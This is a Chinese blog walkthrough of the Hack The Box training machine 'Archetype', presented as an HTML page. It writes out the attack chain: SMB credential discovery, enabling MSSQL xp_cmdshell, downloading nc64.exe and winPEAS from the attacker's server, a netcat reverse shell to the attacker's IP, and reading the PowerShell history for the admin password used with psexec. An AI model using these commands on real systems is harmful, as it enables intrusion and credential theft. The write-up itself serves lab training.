@@ -1,0 +1,455 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>hack the box tier2 Archetype | joke的小世界</title><meta name="author" content="joke"><meta name="copyright" content="joke"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="HTB WP -Archetypetask1:12Which TCP port is hosting a database server?哪一个 TCP 端口正在托管数据库服务器？  nmap 扫一下：   SQL server 明显的数据库服务，答案是： 11433  task2:12What is the name of the non-Administrative share availab">
+<meta property="og:type" content="article">
+<meta property="og:title" content="hack the box tier2 Archetype">
+<meta property="og:url" content="https://simple9656.github.io/2026/08/15/hack-the-box-tier2-Archetype/index.html">
+<meta property="og:site_name" content="joke的小世界">
+<meta property="og:description" content="HTB WP -Archetypetask1:12Which TCP port is hosting a database server?哪一个 TCP 端口正在托管数据库服务器？  nmap 扫一下：   SQL server 明显的数据库服务，答案是： 11433  task2:12What is the name of the non-Administrative share availab">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://picsum.photos/1920/1080?random=2">
+<meta property="article:published_time" content="2026-08-14T20:01:26.000Z">
+<meta property="article:modified_time" content="2026-08-14T20:07:34.924Z">
+<meta property="article:author" content="joke">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://picsum.photos/1920/1080?random=2"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "hack the box tier2 Archetype",
+  "url": "https://simple9656.github.io/2026/08/15/hack-the-box-tier2-Archetype/",
+  "image": "https://picsum.photos/1920/1080?random=2",
+  "datePublished": "2026-08-14T20:01:26.000Z",
+  "dateModified": "2026-08-14T20:07:34.924Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "joke",
+      "url": "https://simple9656.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/9.jpg"><link rel="canonical" href="https://simple9656.github.io/2026/08/15/hack-the-box-tier2-Archetype/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.3"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!true && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'hack the box tier2 Archetype',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont/style.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="/css/transparent.css"><link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 8.1.1"></head><body><script>window.paceOptions = {
+  restartOnPushState: false
+}
+
+btf.addGlobalFn('pjaxSend', () => {
+  Pace.restart()
+}, 'pace_restart')
+
+</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/themes/pink/pace-theme-minimal.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><div class="bg-animation" id="web_bg" style="background-color: #eee;"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/9.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">23</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-book"></i><span> 文章</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-inbox"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://picsum.photos/1920/1080?random=2);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/9.jpg" alt="Logo"><span class="site-name">joke的小世界</span></a><a class="nav-page-title" href="/"><span class="site-name">hack the box tier2 Archetype</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-book"></i><span> 文章</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-inbox"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></li></ul></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">hack the box tier2 Archetype</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-08-14T20:01:26.000Z" title="发表于 2026-08-15 04:01:26">2026-08-15</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-08-14T20:07:34.924Z" title="更新于 2026-08-15 04:07:34">2026-08-15</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="HTB-WP-Archetype"><a href="#HTB-WP-Archetype" class="headerlink" title="HTB WP -Archetype"></a>HTB WP -Archetype</h1><h2 id="task1"><a href="#task1" class="headerlink" title="task1:"></a>task1:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Which TCP port is hosting a database server?</span><br><span class="line">哪一个 TCP 端口正在托管数据库服务器？</span><br></pre></td></tr></table></figure>
+
+<p>nmap 扫一下：</p>
+<img src="/2026/08/15/hack-the-box-tier2-Archetype/image-20260808144449950.png" class="" title="image-20260808144449950">
+
+<p>SQL server 明显的数据库服务，答案是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1433</span><br></pre></td></tr></table></figure>
+
+<h2 id="task2"><a href="#task2" class="headerlink" title="task2:"></a>task2:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">What is the name of the non-Administrative share available over SMB?</span><br><span class="line">通过 SMB 可以访问的非默认共享叫什么名字？</span><br></pre></td></tr></table></figure>
+
+<p>（靶机似了换了个靶机）我们知道SMB服务开在445端口（tier 0 dancing 提到过），使用smbclient连接（-N 匿名登录）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L //10.129.147.3/ -N</span><br><span class="line">-L 列出共享机器列表</span><br><span class="line">-N 匿名登录,不需要密码</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/08/15/hack-the-box-tier2-Archetype/image-20260808184844139.png" class="" title="image-20260808184844139">
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ADMIN$,C$,IPC$都是比较常见的默认共享，而backups是非默认共享的</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.129.147.3/backups -N</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/08/15/hack-the-box-tier2-Archetype/image-20260808185035532.png" class="" title="image-20260808185035532">
+
+<p>答案是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">backups</span><br></pre></td></tr></table></figure>
+
+<h2 id="task3"><a href="#task3" class="headerlink" title="task3:"></a>task3:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">What is the password identified in the file on the SMB share?</span><br><span class="line">SMB 共享上的文件中识别出的密码是什么？</span><br></pre></td></tr></table></figure>
+
+<p>连上去慢慢看:</p>
+<img src="/2026/08/15/hack-the-box-tier2-Archetype/image-20260808185628498.png" class="" title="image-20260808185628498">
+
+<img src="/2026/08/15/hack-the-box-tier2-Archetype/image-20260808185649220.png" class="" title="image-20260808185649220">
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;DTSConfiguration&gt;</span><br><span class="line">    &lt;DTSConfigurationHeading&gt;</span><br><span class="line">        &lt;DTSConfigurationFileInfo GeneratedBy=&quot;...&quot; GeneratedFromPackageName=&quot;...&quot; GeneratedFromPackageID=&quot;...&quot; GeneratedDate=&quot;20.1.2019 10:01:34&quot;/&gt;</span><br><span class="line">    &lt;/DTSConfigurationHeading&gt;</span><br><span class="line">    &lt;Configuration ConfiguredType=&quot;Property&quot; Path=&quot;\Package.Connections[Destination].Properties[ConnectionString]&quot; ValueType=&quot;String&quot;&gt;</span><br><span class="line">        &lt;ConfiguredValue&gt;Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;&lt;/ConfiguredValue&gt;</span><br><span class="line">    &lt;/Configuration&gt;</span><br><span class="line">&lt;/DTSConfiguration&gt;</span><br></pre></td></tr></table></figure>
+
+<p>看到Password&#x3D;M3g4c0rp123。答案是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">M3g4c0rp123</span><br></pre></td></tr></table></figure>
+
+<h2 id="task4"><a href="#task4" class="headerlink" title="task4:"></a>task4:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">What script from Impacket collection can be used in order to establish an authenticated connection to a Microsoft SQL Server?</span><br><span class="line">Impacket 工具包中的哪个脚本可用于建立与 Microsoft SQL Server 的经过身份验证的连接？</span><br></pre></td></tr></table></figure>
+
+<p>回答：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mssqlclient.py</span><br></pre></td></tr></table></figure>
+
+<h2 id="task5"><a href="#task5" class="headerlink" title="task5:"></a>task5:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">What extended stored procedure of Microsoft SQL Server can be used in order to spawn a Windows command shell?</span><br><span class="line">Microsoft SQL Server 的哪个扩展存储过程可用于生成 Windows 命令shell？</span><br></pre></td></tr></table></figure>
+
+<p>回答：（这里就提示了我们后面要连上数据库服务并使用这个命令）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xp_cmdshell</span><br></pre></td></tr></table></figure>
+
+<h2 id="task6"><a href="#task6" class="headerlink" title="task6:"></a>task6:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">What script can be used in order to search possible paths to escalate privileges on Windows hosts?</span><br><span class="line">哪个脚本可用于在 Windows 主机上搜索可能的权限提升路径？</span><br></pre></td></tr></table></figure>
+
+<p>回答：（后面探索powershell历史路径）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winpeas</span><br></pre></td></tr></table></figure>
+
+<h2 id="task7"><a href="#task7" class="headerlink" title="task7:"></a>task7:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">What file contains the administrator&#x27;s password?</span><br><span class="line">哪个文件包含管理员的密码？</span><br></pre></td></tr></table></figure>
+
+<p>没思路了，我需要更详细的东西:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sC 10.129.147.3</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/08/15/hack-the-box-tier2-Archetype/image-20260808191714015.png" class="" title="image-20260808191714015">
+
+<img src="/2026/08/15/hack-the-box-tier2-Archetype/image-20260808191732012.png" class="" title="image-20260808191732012">
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc</span><br></pre></td></tr></table></figure>
+
+<p>sql提示我们用这个密码去连接数据库。使用到impacket里的mssql client:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br><span class="line">git clone https://github.com/fortra/impacket.git</span><br></pre></td></tr></table></figure>
+
+<p>下载好后，建议单开个虚拟环境安装依赖：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 -m venv venv</span><br><span class="line">source venv/bin/activate</span><br><span class="line">pip install .</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/08/15/hack-the-box-tier2-Archetype/image-20260809000050692.png" class="" title="image-20260809000050692">
+
+<p>mssqlclient.py就是我们要用的。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 mssqlclient.py ARCHETYPE/sql_svc@10.129.95.187</span><br></pre></td></tr></table></figure>
+
+<p>至于格式怎么知道的，通过help命令可以查：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 mssqlclient.py -h</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/08/15/hack-the-box-tier2-Archetype/image-20260809000903037.png" class="" title="image-20260809000903037">
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ARCHETYPE: Windows 域名称（如果是在域环境中；如果连接本地用户，通常会替换为目标机器名或直接省略域）。</span><br><span class="line">sql_svc: 用于登录数据库的用户名。</span><br><span class="line">[运行环境] [脚本名称] [域/用户名[:密码]@目标IP]</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/08/15/hack-the-box-tier2-Archetype/image-20260809001411107.png" class="" title="image-20260809001411107">
+
+<p>使用了加密，说明可能是windows的某种验证：</p>
+<img src="/2026/08/15/hack-the-box-tier2-Archetype/image-20260809001508952.png" class="" title="image-20260809001508952">
+
+<p>加个参数即可：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 mssqlclient.py ARCHETYPE/sql_svc@10.129.95.187 -windows-auth</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/08/15/hack-the-box-tier2-Archetype/image-20260809001652660.png" class="" title="image-20260809001652660">
+
+<img src="/2026/08/15/hack-the-box-tier2-Archetype/image-20260809001728157.png" class="" title="image-20260809001728157">
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">enable_xp_cmdshell</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/08/15/hack-the-box-tier2-Archetype/image-20260809001938003.png" class="" title="image-20260809001938003">
+
+<p>我们在SQL服务器内部，无法执行完整命令，所以可以搞一个反向shell（依旧一个终端监听）:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nc -nlvp 443</span><br></pre></td></tr></table></figure>
+
+<p>再开一个终端（将nc64.exe上传到服务器在服务器端监听）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo python3 -m http.server 80   </span><br></pre></td></tr></table></figure>
+
+<img src="/2026/08/15/hack-the-box-tier2-Archetype/image-20260809004012829.png" class="" title="image-20260809004012829">
+
+<p>在连接SQL服务的那个终端尝试运行powershell命令（cmdshell可以调用powershell），比如pwd查看当前路径。</p>
+<img src="/2026/08/15/hack-the-box-tier2-Archetype/image-20260809004419307.png" class="" title="image-20260809004419307">
+
+<p>然后把我的那个nc64.exe上传到服务器上（10.10.16.85是本地vpn ip）：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/int0x33/nc.exe/blob/master/nc64.exe">https://github.com/int0x33/nc.exe/blob/master/nc64.exe</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xp_cmdshell &quot;powershell -c cd C:\Users\sql_svc\Downloads;wget http://10.10.16.85/nc64.exe -outfile nc64.exe&quot;</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/08/15/hack-the-box-tier2-Archetype/image-20260809005804198.png" class="" title="image-20260809005804198">
+
+<p>顺便把扫描工具上传一下：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/peass-ng/PEASS-ng/releases/tag/20260803-00785084">https://github.com/peass-ng/PEASS-ng/releases/tag/20260803-00785084</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xp_cmdshell &quot;powershell -c cd C:\Users\sql_svc\Downloads;wget http://10.10.16.85/winPEASx64.exe -outfile winPEASx64.exe&quot;</span><br></pre></td></tr></table></figure>
+
+<p>这个exe是用来找powershell历史记录的。</p>
+<img src="/2026/08/15/hack-the-box-tier2-Archetype/image-20260809013011551.png" class="" title="image-20260809013011551">
+
+<p>这时候我们可以通过运行nc64.exe开启命令行终端，然后cmd最后被我们本地监听到，构成反向shell:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xp_cmdshell &quot;powershell -c cd C:\Users\sql_svc\Downloads;.\nc64.exe -e cmd.exe 10.10.16.85 443&quot;</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/08/15/hack-the-box-tier2-Archetype/image-20260809010047105.png" class="" title="image-20260809010047105">
+
+<img src="/2026/08/15/hack-the-box-tier2-Archetype/image-20260809012121786.png" class="" title="image-20260809012121786">
+
+<p>咱们先来拿user的flag吧：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd ..</span><br><span class="line">dir</span><br><span class="line">cd Desktop</span><br><span class="line">dir</span><br><span class="line">type user.txt</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/08/15/hack-the-box-tier2-Archetype/image-20260809012316027.png" class="" title="image-20260809012316027">
+
+<img src="/2026/08/15/hack-the-box-tier2-Archetype/image-20260809012343925.png" class="" title="image-20260809012343925">
+
+<p>user flag:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3e7b102e78218e935bf3f4951fec21a3</span><br></pre></td></tr></table></figure>
+
+<p>在 Windows 中，PowerShell 的命令历史记录通常存放在 PSReadLine 目录下的 ConsoleHost_history.txt 文件中。这似乎是一种经验：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine</span><br></pre></td></tr></table></figure>
+
+<p>但我们可以用winpea,来到Downloads文件夹，在powershell语法下，直接输入:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winPEASx64.exe</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/08/15/hack-the-box-tier2-Archetype/image-20260809013130834.png" class="" title="image-20260809013130834">
+
+<img src="/2026/08/15/hack-the-box-tier2-Archetype/image-20260809013208037.png" class="" title="image-20260809013208037">
+
+<p>然后就cd到该文件夹然后读一读：</p>
+<img src="/2026/08/15/hack-the-box-tier2-Archetype/image-20260809013322560.png" class="" title="image-20260809013322560">
+
+<p>成功拿到管理员账密：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">administrator MEGACORP_4dm1n!!</span><br></pre></td></tr></table></figure>
+
+<p>然后回到我们impacket工具用powershell专用的脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec.py </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 psexec.py administrator@10.129.95.187</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/08/15/hack-the-box-tier2-Archetype/image-20260809013816660.png" class="" title="image-20260809013816660">
+
+<p>然后切到对应user看看目录就找到flag了：</p>
+<img src="/2026/08/15/hack-the-box-tier2-Archetype/image-20260809014031066.png" class="" title="image-20260809014031066">
+
+<img src="/2026/08/15/hack-the-box-tier2-Archetype/image-20260809014045566.png" class="" title="image-20260809014045566">
+
+<img src="/2026/08/15/hack-the-box-tier2-Archetype/image-20260809014059525.png" class="" title="image-20260809014059525">
+
+<p>拿到root flag:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b91ccec3305e98240082d4474b848528</span><br></pre></td></tr></table></figure>
+
+<p>同时task7的答案是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ConsoleHost_history.txt</span><br></pre></td></tr></table></figure>
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://simple9656.github.io">joke</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://simple9656.github.io/2026/08/15/hack-the-box-tier2-Archetype/">https://simple9656.github.io/2026/08/15/hack-the-box-tier2-Archetype/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://simple9656.github.io" target="_blank">joke的小世界</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="https://picsum.photos/1920/1080?random=2" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2026/08/15/hack-the-box-tier2-Oopsie/" title="hack the box tier2 Oopsie"><img class="cover" src="https://picsum.photos/1920/1080?random=2" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">hack the box tier2 Oopsie</div></div><div class="info-2"><div class="info-item-1">HTB WP -Oopsietask1:12With what kind of tool can intercept web traffic?拦截网络流量通常使用什么类型的工具？  回答： 12proxy(代理)你可以通过网络代理，将你的流量重定向到代理服务器。  task2:12What is the path to the directory on the webserver that returns a login page?返回登录页面的网页服务器目录路径是什么？  先对容器进行初步探测，nmap扫一下： 1nmap -F 10.129.137.140     开了个http端口，浏览器访问一下：   